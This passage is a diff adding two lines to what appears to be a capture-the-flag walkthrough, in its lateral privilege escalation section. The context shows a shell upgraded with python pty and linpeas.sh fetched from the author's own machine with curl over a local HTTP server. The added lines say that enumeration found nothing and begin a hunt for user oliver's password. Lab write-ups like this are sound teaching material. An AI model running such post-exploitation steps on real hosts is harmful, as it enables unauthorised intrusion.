@@ -70,7 +70,9 @@ This shell is not that beautiful so I just do `python3 -c 'import pty; pty.spawn
 ## Lateral Privilege Escalation
 
 I start by installing `linpeas.sh` on the remote host and run it. I installed `linpeas.sh` by exposing a `http.server` locally and then simply `curl -LO 10.10.16.16:8000/linpeas.sh`.
+While this outputs many things, I was not able to find anything directly here. Sad.
 
+Instead I noticed that within `/home` there is folder for username `oliver`. So, I tried finding a password. I had to do manual lookups and 
 
 
 
